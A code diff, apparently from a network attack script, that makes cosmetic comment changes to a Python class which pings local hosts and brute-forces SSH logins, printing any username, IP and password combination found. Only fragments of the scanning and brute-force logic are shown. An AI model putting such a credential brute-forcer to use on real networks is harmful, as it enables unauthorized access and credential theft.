@@ -14,6 +14,8 @@ iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
 own_ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
 myself = sys.argv[0]
 
+# --------------------------------------------------------------------------------------
+
 class TheBuster:
 
     def ping_stuff(self):
@@ -51,7 +53,6 @@ class TheBuster:
                     pass
 
                 else:
-                    #blacklisted = "192.168.1.130"
                     blacklisted = "192.168.1.1"
                     if i == str(blacklisted):
                         print(i, " => This is where the creds go..")
@@ -68,7 +69,7 @@ class TheBuster:
 
         alive_list.close()
 
-    # --------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------
 
     def brute_stuff(self):
 
@@ -101,7 +102,7 @@ class TheBuster:
 
                         sys.exit()
 
-    # --------------------------------------------------------------------------------------
+# --------------------------------------------------------------------------------------
 
     def is_ssh_open(self, ipaddr, username, password):
 
@@ -132,10 +133,6 @@ class TheBuster:
             combo = username + "@" + ipaddr + ":" + password
             print(f"[+] Found combo: {combo}")
 
-            #print(combo)
-            #global c_nation
-            #c_nation = combo
-
             return True
 
     # --------------------------------------------------------------------------------------
@@ -145,4 +142,3 @@ if __name__ == '__main__':
     a.ping_stuff()
     a.brute_stuff()
     sys.exit()
-
